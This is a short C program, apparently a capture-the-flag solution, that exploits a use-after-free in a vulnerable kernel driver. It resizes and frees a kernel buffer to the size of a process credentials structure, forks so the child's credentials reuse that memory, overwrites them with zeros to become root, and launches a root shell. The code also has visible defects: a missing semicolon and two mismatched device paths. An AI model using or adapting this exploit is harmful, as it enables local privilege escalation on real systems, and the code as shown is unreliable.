#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>

int fd1;
int fd2
void errpro(char* buf){
    printf("Error %s\n",buf);
    exit(-1);
}

void krealloc(int fd, size_t num){
    if(-1 == ioctl(fd, 0x10001, num)){
        errpro("krealloc");
    }
}

int main(){
    fd1 = open("/dev/babydrv",2);
    if(fd1 < 0){
        errpro("Open dev1");
    }
    fd2 = open("/dev/babydev", 2);
    if(fd2 < 0){
        errpro("Open dev2");
    }

    krealloc(fd1, 0xa8);
    close(fd1);

    int pid = fork();
    if(pid < 0){
        errpro("fork pid");
    }
    else if(pid == 0){
        char buf[30] = { 0 };
        write(fd2, buf, 0x28);

        if(!getuid()){
            puts("Root now====>");
            system("/bin/sh");
        }
        else{
            errpro("change creds");
        }

    }
    else{
        wait(NULL);
    }
    close(fd2);
    return 0;
}